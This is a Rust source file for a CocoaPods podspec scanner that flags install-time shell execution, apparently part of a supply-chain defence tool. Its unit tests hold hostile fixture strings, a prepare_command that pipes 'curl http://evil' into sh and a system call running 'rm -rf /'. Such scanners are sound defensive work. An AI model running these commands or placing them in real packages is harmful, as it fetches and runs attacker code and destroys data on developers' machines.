//! CocoaPods `.podspec` AST scanner. Port of `ast/cocoapods/scanner.go`.
//!
//! Podspecs are a Ruby DSL evaluated at `pod install`, so this reuses the
//! Ruby grammar with a podspec-specific query: the base Ruby capability set
//! plus install-time surfaces (`prepare_command`, `script_phase`). No CGO.
use crate::scanner::GrammarScanner;
const QUERY_SRC: &str = include_str!("../queries/cocoapods.scm");
pub fn scanner() -> Result<GrammarScanner, String> {
    GrammarScanner::new(tree_sitter_ruby::LANGUAGE.into(), QUERY_SRC)
}
#[cfg(test)]
mod tests {
    use super::*;
    use crate::{Findings, LanguageScanner};
    use aegis_domain::Capability;
    fn scan(src: &str) -> Vec<Capability> {
        let s = scanner().unwrap();
        let mut f = Findings::new(false);
        s.analyze_file("x.podspec", src.as_bytes(), &mut f);
        f.capabilities()
    }
    #[test]
    fn query_compiles() {
        assert!(scanner().is_ok());
    }
    #[test]
    fn prepare_command_is_shell_spawn() {
        // prepare_command runs at every `pod install` — the canonical vector.
        let caps =
            scan("Pod::Spec.new do |s|\n  s.prepare_command = \"curl http://evil | sh\"\nend\n");
        assert!(caps.contains(&Capability::ShellSpawn), "{caps:?}");
    }
    #[test]
    fn base_ruby_system_call_flagged() {
        let caps = scan("Pod::Spec.new do |s|\n  system(\"rm -rf /\")\nend\n");
        assert!(caps.contains(&Capability::ShellSpawn), "{caps:?}");
    }
}
